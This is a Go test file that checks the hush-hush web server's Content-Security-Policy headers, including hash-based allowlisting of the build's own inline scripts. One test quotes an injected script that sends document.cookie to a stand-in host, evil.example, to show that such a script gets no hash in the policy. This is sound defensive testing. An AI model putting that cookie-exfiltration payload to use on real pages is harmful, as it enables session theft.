package api_test

import (
	"crypto/sha256"
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"testing/fstest"

	hushhush "github.com/alrayyes/hush-hush/internal/api"
	"github.com/alrayyes/hush-hush/internal/store"
	"github.com/stretchr/testify/require"
)

// The web UI is served under a Content-Security-Policy that lets a script run
// only if it comes from this origin or is one of the inline scripts the build
// itself produced (alrayyes/hush-hush#660). The hashes are computed from the
// embedded index.html when the server starts, so they can't drift from the
// build, and a script an attacker injects into the page isn't in that file.

const (
	inlineThemeScript = "(() => { document.documentElement.setAttribute('data-theme', 'dark'); })();"
	inlineBootScript  = "{ __sveltekit_x = { base: '' }; import('/_app/entry.js'); }"
)

func spaWith(index string) fstest.MapFS {
	return fstest.MapFS{
		"index.html":       {Data: []byte(index)},
		"_app/entry.js":    {Data: []byte("export {};")},
		"_app/version.txt": {Data: []byte("test")},
	}
}

func sha256Source(script string) string {
	sum := sha256.Sum256([]byte(script))

	return "'sha256-" + base64.StdEncoding.EncodeToString(sum[:]) + "'"
}

func serveSPA(t *testing.T, build fstest.MapFS, path string) *httptest.ResponseRecorder {
	t.Helper()

	s, err := store.Open(":memory:")
	require.NoError(t, err)
	t.Cleanup(func() { require.NoError(t, s.Close()) })

	rec := httptest.NewRecorder()
	hushhush.NewMux(s, testPublicURL, build, testVersion).ServeHTTP(rec, httptest.NewRequest(http.MethodGet, path, nil))

	return rec
}

func directives(policy string) map[string]string {
	out := map[string]string{}

	for part := range strings.SplitSeq(policy, ";") {
		name, value, _ := strings.Cut(strings.TrimSpace(part), " ")
		out[name] = value
	}

	return out
}

func TestTheWebUIIsServedUnderAContentSecurityPolicy(t *testing.T) {
	t.Parallel()

	index := `<!doctype html><html><head>
<script>` + inlineThemeScript + `</script>
</head><body><div>
<script src="/_app/external.js"></script>
<script type="module">` + inlineBootScript + `</script>
</div></body></html>`

	for _, path := range []string{"/", "/login", "/some/spa/route", "/_app/entry.js"} {
		t.Run(path, func(t *testing.T) {
			t.Parallel()

			rec := serveSPA(t, spaWith(index), path)
			require.Equal(t, http.StatusOK, rec.Code)

			got := directives(rec.Header().Get("Content-Security-Policy"))

			require.Equal(t, "'self'", got["default-src"])
			require.Equal(t, "'none'", got["frame-ancestors"])
			require.Equal(t, "'none'", got["base-uri"])
			require.Equal(t, "'self'", got["form-action"])
			require.Equal(t, "'none'", got["object-src"])
			require.Equal(t, "'self'", got["connect-src"])

			script := strings.Fields(got["script-src"])
			require.ElementsMatch(t,
				[]string{"'self'", sha256Source(inlineThemeScript), sha256Source(inlineBootScript)}, script,
				"script-src allows this origin and exactly the two inline scripts, nothing else")
			require.NotContains(t, got["script-src"], "unsafe-inline")
			require.NotContains(t, got["script-src"], "unsafe-eval")
		})
	}
}

func TestAPageWithNoInlineScriptsAllowsOnlyItsOwnOrigin(t *testing.T) {
	t.Parallel()

	rec := serveSPA(t, spaWith(testIndexHTML), "/")

	require.Equal(t, "'self'", directives(rec.Header().Get("Content-Security-Policy"))["script-src"])
}

func TestAnInlineScriptThatIsNotInTheBuildIsNotAllowed(t *testing.T) {
	t.Parallel()

	rec := serveSPA(t, spaWith(`<script>`+inlineThemeScript+`</script>`), "/")

	injected := sha256Source("fetch('https://evil.example/?c=' + document.cookie)")
	require.NotContains(t, rec.Header().Get("Content-Security-Policy"), injected)
}

func TestTheAPIIsNotGivenAPagePolicy(t *testing.T) {
	t.Parallel()

	rec := serveSPA(t, spaWith(testIndexHTML), "/healthz")

	require.Empty(t, rec.Header().Get("Content-Security-Policy"), "a JSON response isn't a document")
}
